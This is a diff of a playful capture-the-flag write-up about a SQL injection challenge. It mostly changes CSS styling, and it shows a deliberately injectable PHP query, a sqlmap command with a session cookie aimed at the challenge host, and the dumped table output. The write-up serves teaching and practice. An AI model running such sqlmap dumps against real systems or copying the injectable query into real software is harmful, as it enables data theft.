@@ -9,10 +9,33 @@ author: Tina Ismail
 ---
 <style>
     h1, h2, h3, p {
-        font-family: Papyrus,serif;
+        font-family: "Trebuchet MS", serif;
+        font-weight:bold;
+    }
+    h1,h2,h3{
+        font-family: Harrington, Papyrus;
+        background-color:#436436;
+        border-radius:20px;
+        text-align:center;
+        padding:1%;
+        color:white;
+        box-shadow: 0 0 10px #436436, 0 0 20px #436436;
+        margin-top:30px;
+        transition: box-shadow 0.3s ease-in-out;
+    }
+    *{
+        background-color:#f0e4d1;
+        color:#141210;
+    }
+    code{
+        color=white;
+        background-color:black;
+    }
+    img{
+        margin:auto;
     }
 </style>
-### Greetings weary travellers!
+## Greetings weary travellers!
 
 Settle down as I tell you my tale. Few will believe my exploits but I swear it to be true. Here you will learn of my forbidden methods.
 
@@ -23,7 +46,7 @@ We enter this portal of dubious origin. The description specifically mentions th
 ### The Magic of SQL Injections
 You might be wondering what that string was that we entered into the password field. It certainly looks strange, but I assure you I am no magician! This is a classic SQL Injection payload.<br>
 
-<a href="https://xkcd.com/327/">![Exploits of a Mom](https://imgs.xkcd.com/comics/exploits_of_a_mom.png)</a>
+<a class="image" href="https://xkcd.com/327/">![Exploits of a Mom](https://imgs.xkcd.com/comics/exploits_of_a_mom.png)</a>
 
 Databases are essential to crafting any meaninful web application. Just think about your favourite social media website that has to summon all kinds of information about its users or uploaded content. If you're a library enjoyer like I am, have you ever wondered how your library's catalogue just *knows* what books are available, at which libraries you may find them, and for what ages they're meant? This functionality is made possible through the use of relational databases, a sort of organized store of data stuctured in tables.
 
@@ -31,7 +54,7 @@ SQL is the glue that binds it all together, and it stands for Structured Query L
 
 Below is a standard SQL query within a php script. The query is `"SELECT * FROM users WHERE username='$username'"` where username is a field populated by user input.
 
-```php
+```
 <?php
     $username = $_GET['username'];
     $result = mysql_query("SELECT * FROM users WHERE username='$username'");
@@ -50,13 +73,13 @@ With this in mind, we set the username field to slime001, and attempt a sql inje
 
 ![Slime001's Mythical Shop](/assets/img/issessions26-sqli-shop.png)
 
-```bash
+```
 sqlmap -u "https://issessionsctf-sql-injection-challenge.chals.io/items/?search=1%3D%3D1" --cookie="session=eyJ1c2VyX2lkIjoxfQ.aZtS0w.ROwLPykA6ybPz7_UPr5jePYct6o" -p search -T items -a --batch
 ```
 
 The output of this command is a long one, but if you bear with it it tells you all you need, including the true password for our user slime001.
 
-```bash
+```
         ___
        __H__
  ___ ___[']_____ ___ ___  {1.9.11#stable}
@@ -137,7 +160,8 @@ Table: items
 
 [*] ending @ 14:27:36 /2026-02-22/
 ```
-It's a bit hard to make sense of in the above SQLMAP output snippet, so here is the table items in the current database named `SQLite_masterdb`. Look closely for the flag. Did you catch it?
+It's a bit hard to make sense of in the above SQLMAP output snippet, so here is the table items in the current database named `SQLite_masterdb`. Look closely for the flag. Did you catch it?<br>
+
 | id | info | name | image | price | hidden |
 |----|------|------|-------|-------|--------|
 | 1 | A legendary weapon forged through magic or ancient ritual, its blade constantly engulfed in living fire. The flames do not consume the wielder but instead respond to their will, intensifying with emotion or combat prowess. Each strike scorches armor and flesh alike, leaving burning wounds and radiant trails of heat in the air. Often tied to elemental fire spirits, dragons, or lost civilizations, the sword is both a symbol of destructive power and a test of mastery, rewarding only those strong enough to control its blazing fury. | Sword of Flames | images/red sword.png | 1000 | 0 |
